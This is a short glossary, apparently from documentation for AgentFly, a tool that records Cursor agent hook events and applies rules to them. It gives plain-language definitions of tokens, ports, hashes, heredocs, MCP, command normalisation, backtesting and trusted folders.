- **Token:** a random secret string kept in a file; the hook client sends it so
  the recorder knows the request is from AgentFly.
- **Port:** the numbered door on your machine the recorder listens at (8787).
- **Hash:** a short fingerprint of a file; if the file changes, the fingerprint
  changes.
- **Heredoc:** a way to write a block of text inside a shell command
  (`<<EOF … EOF`).
- **MCP:** Cursor's way of giving the agent add-on tools.
- **Normalisation:** rewriting a command into a plain, comparable form (for
  example, looking inside `bash -c '…'`) before a rule reads it.
- **Backtest:** replaying a rule change over your stored sessions to see what it
  would have done.
- **Trusted folder:** Cursor only runs project-level hooks in folders you marked
  trusted.
